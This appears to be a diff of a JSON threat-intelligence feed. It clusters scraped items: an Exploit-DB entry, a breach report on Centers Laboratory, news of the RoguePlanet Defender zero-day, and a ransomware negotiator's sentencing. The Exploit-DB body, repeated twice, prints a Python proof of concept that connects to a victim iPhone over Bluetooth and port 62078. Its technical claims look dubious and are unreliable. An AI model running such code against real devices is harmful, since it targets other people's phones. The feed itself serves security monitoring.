-        "published": "2026-07-07T00:00:00+00:00",
-        "summary": "iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real \"Ethernet\" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = \"XX:XX:XX:XX:XX:XX\" USB_PORT = 62078 def create_pan_connection(mac_address): \"\"\" Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. \"\"\" try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f\"[+] PAN connection established to {mac_address}\") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect((\"172.20.10.1\", USB_PORT)) print(f\"[+] USB port {USB_PORT} is now open and reachable!\") print(\"[+] Ethernet icon should now be visible on the target iPhone.\") usb_sock.close() sock.close() except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": print(\"[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway\") print(\"[*] Target MAC: \" + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "Apple iOS/macOS": "mention"
-          },
-          "weak_tags": {
-            "products": [
-              [
-                "Apple iOS/macOS",
-                "mention",
-                0.29
-              ]
-            ]
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
-          "link": "https://www.exploit-db.com/exploits/52618",
-          "published": "2026-07-07T00:00:00+00:00",
-          "summary": "iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "Apple iOS/macOS": "mention"
-            },
-            "weak_tags": {
-              "products": [
-                [
-                  "Apple iOS/macOS",
-                  "mention",
-                  0.29
-                ]
-              ]
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "8d0224c08d",
       "priority_score": 10,
       "member_count": 1,
@@ -3720,6 +3915,97 @@
             "role_map": {},
             "weak_tags": {
               "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "0514a6908e",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
+        "link": "https://www.exploit-db.com/exploits/52618",
+        "published": "2026-07-07T00:00:00+00:00",
+        "summary": "iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real \"Ethernet\" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = \"XX:XX:XX:XX:XX:XX\" USB_PORT = 62078 def create_pan_connection(mac_address): \"\"\" Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. \"\"\" try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f\"[+] PAN connection established to {mac_address}\") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect((\"172.20.10.1\", USB_PORT)) print(f\"[+] USB port {USB_PORT} is now open and reachable!\") print(\"[+] Ethernet icon should now be visible on the target iPhone.\") usb_sock.close() sock.close() except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": print(\"[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway\") print(\"[*] Target MAC: \" + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Apple iOS/macOS": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "Apple iOS/macOS",
+                "mention",
+                0.29
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
+          "link": "https://www.exploit-db.com/exploits/52618",
+          "published": "2026-07-07T00:00:00+00:00",
+          "summary": "iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Apple iOS/macOS": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "Apple iOS/macOS",
+                  "mention",
+                  0.29
+                ]
+              ]
             }
           }
         }
@@ -4193,123 +4479,6 @@
               "Okta": "target",
               "Microsoft 365": "target",
               "Apple iOS/macOS": "target",
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "c06f0c2fb1",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "education",
-          "government",
-          "healthcare",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "GitHub",
-          "Palo Alto Networks"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "SecurityWeek",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Centers Laboratory Data Breach Affects 540,000 Individuals",
-        "link": "https://www.securityweek.com/centers-laboratory-data-breach-affects-540000-individuals/",
-        "published": "2026-07-13T08:10:44+00:00",
-        "summary": "The WorldLeaks extortion group claimed to have stolen 720 GB of data from the healthcare testing and laboratory services provider. The post Centers Laboratory Data Breach Affects 540,000 Individuals appeared first on SecurityWeek .",
-        "full_body": "Healthcare diagnostics company Centers Laboratory (Centers Lab NJ LLC) has informed the US government that a data breach discovered nearly one year ago affects more than 540,000 individuals. According to a data breach notice posted on its website, the New Jersey-based provider of testing and laboratory services for healthcare organizations discovered an intrusion in its IT environment in August 2025. An investigation showed that threat actors had gained “limited access” to Centers Laboratory systems between August 9 and August 14, exfiltrating personal and protected health information, including names, dates of birth, SSNs, driver’s license or state identification numbers, passport numbers, and health insurance and medical information. The healthcare data breach tracker maintained by the Department of Health and Human Services revealed last week that the data breach affects 542,377 individuals. Centers Lab was targeted by the WorldLeaks cybercrime group, which listed the organization on its website in October 2025. The hackers leaked more than 1.6 million files totaling 720 GB, allegedly stolen from Centers Lab systems. Advertisement. Scroll to continue reading. WorldLeaks, which made headlines for targeting major companies such as Nike and Dell , emerged in 2025 following the shutdown of the Hunters International ransomware group. Following the transition to WorldLeaks, the cybercriminals stopped using file-encrypting malware and have focused on data theft and extortion. More than 170 organizations are listed on the group’s website at the time of writing. Related : 12 Million Impacted by Data Breach at Japanese Telco KDDI Related : Mount Royal University Confirms Data Stolen in Ransomware Attack Related : Accenture Confirms Data Breach After Hacker Claims Source Code Theft Related : Medtronic Data Breach Impacts 3.8 Million People Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Google Patches 382 Chrome Vulnerabilities BlueHammer Vulnerability Exploited in Ransomware Attacks Latest News Hacker Conversations: Jesse McGraw (GhostExodus), From Blackhat Hacker to Redemption Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 RabbitMQ Vulnerability Threatens Enterprise Systems Zimbra Patches Critical Code Execution Vulnerability EU Targets Russian Intelligence Officers Accused of Running a Yearslong Cyber Spying Campaign Organizations Warned of Exploited Joomla Extension Vulnerabilities Progress Prompts ShareFile Storage Zone Controller Shutdown Amid Security Concerns Ghost Accounts Abuse GitHub API in Mass Recon Campaign Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Security Summit July 16, 2026 This year's summit will help organizations learn ho",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "government",
-            "manufacturing_industrial",
-            "education"
-          ],
-          "affected_products": [
-            "Palo Alto Networks",
-            "GitHub"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Palo Alto Networks": "target",
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "SecurityWeek",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Centers Laboratory Data Breach Affects 540,000 Individuals",
-          "link": "https://www.securityweek.com/centers-laboratory-data-breach-affects-540000-individuals/",
-          "published": "2026-07-13T08:10:44+00:00",
-          "summary": "The WorldLeaks extortion group claimed to have stolen 720 GB of data from the healthcare testing and laboratory services provider. The post Centers Laboratory Data Breach Affects 540,000 Individuals appeared first on SecurityWeek .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "government",
-              "manufacturing_industrial",
-              "education"
-            ],
-            "affected_products": [
-              "Palo Alto Networks",
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Palo Alto Networks": "target",
               "GitHub": "target"
             },
             "weak_tags": {
@@ -5253,6 +5422,123 @@
               "Palo Alto Networks": "target",
               "Okta": "target",
               "Microsoft 365": "target",
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "c06f0c2fb1",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "education",
+          "government",
+          "healthcare",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "GitHub",
+          "Palo Alto Networks"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "SecurityWeek",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Centers Laboratory Data Breach Affects 540,000 Individuals",
+        "link": "https://www.securityweek.com/centers-laboratory-data-breach-affects-540000-individuals/",
+        "published": "2026-07-13T08:10:44+00:00",
+        "summary": "The WorldLeaks extortion group claimed to have stolen 720 GB of data from the healthcare testing and laboratory services provider. The post Centers Laboratory Data Breach Affects 540,000 Individuals appeared first on SecurityWeek .",
+        "full_body": "Healthcare diagnostics company Centers Laboratory (Centers Lab NJ LLC) has informed the US government that a data breach discovered nearly one year ago affects more than 540,000 individuals. According to a data breach notice posted on its website, the New Jersey-based provider of testing and laboratory services for healthcare organizations discovered an intrusion in its IT environment in August 2025. An investigation showed that threat actors had gained “limited access” to Centers Laboratory systems between August 9 and August 14, exfiltrating personal and protected health information, including names, dates of birth, SSNs, driver’s license or state identification numbers, passport numbers, and health insurance and medical information. The healthcare data breach tracker maintained by the Department of Health and Human Services revealed last week that the data breach affects 542,377 individuals. Centers Lab was targeted by the WorldLeaks cybercrime group, which listed the organization on its website in October 2025. The hackers leaked more than 1.6 million files totaling 720 GB, allegedly stolen from Centers Lab systems. Advertisement. Scroll to continue reading. WorldLeaks, which made headlines for targeting major companies such as Nike and Dell , emerged in 2025 following the shutdown of the Hunters International ransomware group. Following the transition to WorldLeaks, the cybercriminals stopped using file-encrypting malware and have focused on data theft and extortion. More than 170 organizations are listed on the group’s website at the time of writing. Related : 12 Million Impacted by Data Breach at Japanese Telco KDDI Related : Mount Royal University Confirms Data Stolen in Ransomware Attack Related : Accenture Confirms Data Breach After Hacker Claims Source Code Theft Related : Medtronic Data Breach Impacts 3.8 Million People Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability AI Coding Tools Tricked Into Hacking Developer Machine via Decades-Old Technique Google Patches 382 Chrome Vulnerabilities BlueHammer Vulnerability Exploited in Ransomware Attacks Latest News Hacker Conversations: Jesse McGraw (GhostExodus), From Blackhat Hacker to Redemption Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 RabbitMQ Vulnerability Threatens Enterprise Systems Zimbra Patches Critical Code Execution Vulnerability EU Targets Russian Intelligence Officers Accused of Running a Yearslong Cyber Spying Campaign Organizations Warned of Exploited Joomla Extension Vulnerabilities Progress Prompts ShareFile Storage Zone Controller Shutdown Amid Security Concerns Ghost Accounts Abuse GitHub API in Mass Recon Campaign Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Why Email Security Keeps Failing (And What Has to Change) July 8, 2026 Join this live webinar as we break down why email-layer defenses alone can't keep pace with the modern phishing ecosystem, how agentic AI is changing the capacity equation for security teams, and more. Register Virtual Event: 2026 Cloud Security Summit July 16, 2026 This year's summit will help organizations learn ho",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "healthcare",
+            "government",
+            "manufacturing_industrial",
+            "education"
+          ],
+          "affected_products": [
+            "Palo Alto Networks",
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Palo Alto Networks": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SecurityWeek",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Centers Laboratory Data Breach Affects 540,000 Individuals",
+          "link": "https://www.securityweek.com/centers-laboratory-data-breach-affects-540000-individuals/",
+          "published": "2026-07-13T08:10:44+00:00",
+          "summary": "The WorldLeaks extortion group claimed to have stolen 720 GB of data from the healthcare testing and laboratory services provider. The post Centers Laboratory Data Breach Affects 540,000 Individuals appeared first on SecurityWeek .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "healthcare",
+              "government",
+              "manufacturing_industrial",
+              "education"
+            ],
+            "affected_products": [
+              "Palo Alto Networks",
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Palo Alto Networks": "target",
               "GitHub": "target"
             },
             "weak_tags": {
@@ -6665,6 +6951,291 @@
       ]
     },
     {
+      "cluster_id": "8fa37afed0",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "legal_professional"
+        ],
+        "affected_products": [
+          "Microsoft Defender"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-33825",
+          "CVE-2026-50656"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "emergency_patch",
+          "no_patch_yet",
+          "poc_available",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Microsoft Reins in RoguePlanet Zero-Day Threat",
+        "link": "https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat",
+        "published": "2026-07-09T20:21:19+00:00",
+        "summary": "The researcher known as \"Nightmare-Eclipse\" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.",
+        "full_body": "Vulnerabilities & Threats Cyber Risk Application Security Cybersecurity Operations News Microsoft Reins in RoguePlanet Zero-Day Threat The researcher known as \"Nightmare-Eclipse\" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days. Rob Wright , Senior News Director , Dark Reading July 9, 2026 4 Min Read Source: Mark StevensonUIG via Getty Images Microsoft has tackled yet another zero-day vulnerability published by a disgruntled security researcher with a vendetta against the software giant. On Wednesday, Microsoft issued an out-of-band patch for RoguePlanet , an elevation-of-privilege vulnerability in Windows Defender, tracked as CVE-2026-50656. The high-severity flaw, which received a 7.8 CVSS score from Microsoft, could allow an attacker to escalate privileges on a Windows device from a basic user to the highest SYSTEM-level access, which would give them complete control over the device. RoguePlanet was initially published, along with a proof-of-concept (PoC) exploit, by an anonymous security researcher known as \"Nightmare-Eclipse,\" who has been embroiled in a public feud with Microsoft for several months. The dispute began in April when the researcher published an exploit for another privilege-escalation flaw in Windows Defender, dubbed \" BlueHammer \" and tracked as CVE-2026-33825, out of frustration with Microsoft's Security Response Center (MSRC). Related: Fresh ATM Crypto Software Bugs: Jackpot or Bust? The feud escalated over several weeks, with Microsoft taking action and issuing legal threats, while Nightmare-Eclipse continued publishing additional zero-day exploits , several of which came under attack soon after. The research swore revenge against Microsoft for allegedly humiliating them, and threatened to \"make sure your bones are shattered\" on July 14, though Nightmare-Eclipse has since backed off that date. RoguePlanet's Enterprise Cyber-Risks The patch for RoguePlanet is included in the Microsoft Malware Protection Engine version 1.1.26060.3008. According to Microsoft's advisory for CVE-2026-50656, Windows systems that have disabled Microsoft Defender \"are not in an exploitable state.\" However, Microsoft noted the attack complexity for the vulnerability is low, and that exploitation is \"more likely.\" In a blog post on Thursday, SOCRadar noted that while RoguePlanet requires local access to a vulnerable device before exploitation and is best described a post-compromise privilege-escalation exploit, it's still dangerous. \"RoguePlanet is not remotely exploitable by itself, but it can be highly valuable after an attacker gains local code execution as a standard user,\" the research team wrote in the blog post. As a second-stage tool, SOCRadar said RoguePlanet could give a threat actor the ability to tamper with security products and telemetry, dump credentials for lateral movement, and establish persistence through scheduled tasks and other techniques. Additionally, SOCRadar noted that Nightmare-Eclipse's ongoing feud with Microsoft has \"driven multiple public exploit releases ahead of typical patch cycles, increasing risk for unpatched environments.\" SOCRadar chief information security officer (CISO) Ensar Seker tells Dark Reading that, while it's unusual for Microsoft to issue an emergency update shortly before a Patch Tuesday release (July's is on the 14th), it's likely due to increased urgency around a flaw. Related: CitrixBleed-ing Again? NetScaler Vulnerability Under Attack \"Nightmare-Eclipse has repeatedly published detailed technical analyses and proof-of-concept exploits shortly after Patch Tuesday, reducing the amount of time defenders have before attackers can begin weaponizing the research,\" Seker says. \"Even if Microsoft had already been preparing the fix, widespread public availability of exploit details likely accelerated its release.\" RoguePlanet's Uncertain Exploitation Status Despite a public exploit being av",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "legal_professional"
+          ],
+          "affected_products": [
+            "Microsoft Defender"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-50656",
+            "CVE-2026-33825"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "emergency_patch",
+            "no_patch_yet",
+            "poc_available"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Microsoft Defender": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Microsoft Reins in RoguePlanet Zero-Day Threat",
+          "link": "https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat",
+          "published": "2026-07-09T20:21:19+00:00",
+          "summary": "The researcher known as \"Nightmare-Eclipse\" published a proof-of-concept (PoC) exploit for the Windows Defender vulnerability in early June after dropping several other Microsoft zero-days.",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "legal_professional"
+            ],
+            "affected_products": [
+              "Microsoft Defender"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-50656",
+              "CVE-2026-33825"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "emergency_patch",
+              "no_patch_yet",
+              "poc_available"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Microsoft Defender": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "7cdd398efc",
+      "priority_score": 8,
+      "member_count": 3,
+      "corroborating_source_count": 3,
+      "strong_signals": [
+        "BlackCat/ALPHV"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "BlackCat/ALPHV"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Help Net Security",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Ransomware negotiator who betrayed clients sentenced to 70 months in prison",
+        "link": "https://www.helpnetsecurity.com/2026/07/13/ransomware-negotiator-blackcat-sentence/",
+        "published": "2026-07-13T12:22:17+00:00",
+        "summary": "A former ransomware negotiator at incident response firm DigitalMint has been sentenced to 70 months in prison after admitting he shared confidential client information with the BlackCat ransomware group and later helped carry out ransomware attacks. Prosecutors say Angelo Martino, 41, abused his role at DigitalMint beginning in April 2023 by providing BlackCat operators with sensitive information gathered during ransomware negotiations. The information included victims’ negotiating positions, insurance policy limits, and internal assessments, helping the … More → The post Ransomware negotiator who betrayed clients sentenced to 70 months in prison appeared first on Help Net Security .",
